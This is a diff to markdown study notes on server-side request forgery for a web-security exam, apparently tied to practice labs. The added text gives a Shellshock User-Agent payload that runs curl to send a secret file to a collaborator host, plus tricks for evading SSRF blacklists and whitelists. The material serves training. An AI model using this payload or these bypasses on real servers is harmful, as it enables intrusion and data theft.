@@ -13,25 +13,38 @@
   - [6. SSRF with whitelist-based input filter](./lab/6.%20SSRF%20with%20whitelist-based%20input%20filter.md)
   - [7. Blind SSRF with Shellshock exploitation](./lab/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation.md)
 
-## Summary
+## Detect
 
-check every user-controlled field that looks like a URL, a path,...
+check every user-controlled field that looks like a URL, a path, ...
 
-use collaborator everywhere extension to check if any field, such as `User-Agent`, `Referer` has ping back problem.
+tools:
 
-preventation:
+- burpsuite extension: `collaborator everywhere`
+  - add target to scope
+  - manually check target
 
-- blacklist
-- whitelist
+## Shellshock for exam
 
-circumvention:
+detect:
 
-- open redirection
+- ping back at `user-agent` and `referer`
 
-blind ssrf:
+payload:
 
-- oob detection
-- shellshock
+```http
+User-Agent: () { :; }; /usr/bin/curl http://collaborator -d "$(cat /home/carlos/secret)"
+Referer: http://localhost:6566
+```
+
+## Preventions
+
+- blacklist:
+  - Using an alternative IP representation of `127.0.0.1`: such as `2130706433`, `017700000001`, or `127.1`.
+  - Registering your own domain name that resolves to 127.0.0.1. You can use `spoofed.burpcollaborator.net` for this purpose.
+  - Obfuscating blocked strings using URL encoding or case variation.
+- whitelist:
+  - bypass: open redirection
+  - [lab 6](./lab/6.%20SSRF%20with%20whitelist-based%20input%20filter.md)
 
 ## Exam only
 
